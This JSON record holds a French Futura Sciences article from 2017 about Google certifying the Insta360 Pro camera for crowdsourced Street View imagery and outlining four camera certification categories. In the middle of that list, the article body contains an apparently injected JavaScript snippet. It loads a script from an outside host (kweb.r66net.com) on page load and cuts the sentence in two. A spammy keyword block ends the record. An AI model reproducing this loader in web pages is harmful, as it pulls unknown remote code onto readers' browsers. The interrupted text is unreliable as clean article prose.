{"title": "Street View : Google certifie une caméra 360° pour vous faire travailler gratuitement", "newspaper": "Futura Sciences", "author": "Jean-Luc Goudet", "date_publi": "10/10/2017", "content": "Déboursez 4.000 euros pour acheter cette caméra à fixer sur votre voiture et vous aurez le droit d'alimenter le service Street View de Google. Ne dites pas  « travail bénévole » mais   « crowdsourcing » ... Annoncée en mai, cette campagne de  certification  de caméras vise à permettre au service  Google Street View  de profiter des possibilités du  crowdsourcing  en autorisant les utilisateurs lambda à enrichir la carte immersive. Plusieurs certifications ont été définies, dont l'une pour les caméras embarquées sur un véhicule. Le premier modèle à décrocher ce  feu  vert est l'Insta360 VR Pro, de fabrication chinoise et dédiée à la  réalité virtuelle . Cette caméra 360° 8K, vendue environ 4.200 euros, est équipée d'un système de stabilisation et d'un algorithme d'assemblage du flux d'images enregistrées pendant que le véhicule est en  mouvement . L'utilisateur peut contrôler la caméra avec l' application  Street View et envoyer son contenu filmé à 360° directement vers le site, grâce à un  logiciel  spécial. La caméra sera également prêtée à des photographes, voyageurs et autres contributeurs approuvés par  Google . La caméra professionnelle Insta360 VR Pro, fabriquée par la start-up chinoise du même nom, s'était fait remarquée au CES 2017, à Las Vegas. © DR                               Quatre familles de caméras travailleront pour Google L'Insta360 Pro 8K fait partie des vingt nouvelles  caméras 360°  qui vont apparaître sur le marché dans les mois à venir. Google a prévu quatre catégories de certification :  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  les caméras mobiles Street View, capables de publier des images prises à 360° à partir d'une application mobile ; les caméras Street View VR, qui enregistrent des données géométriques en plus des photos ; des caméras qui seront associées à des outils de publication capables de télécharger du contenu vers les comptes Street View ; les caméras « auto ready », qui peuvent capturer des images avec la plus grande précision, comme l'Insta360 Pro. Avec AFP Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  google street  |  google voiture camera  |  street war  |  travailler pour wwf  |  certifie bbc  |  googl street  |  street views  |  pay per view definition  |  view compagnon  |  ocean data view", "theme": "tech"}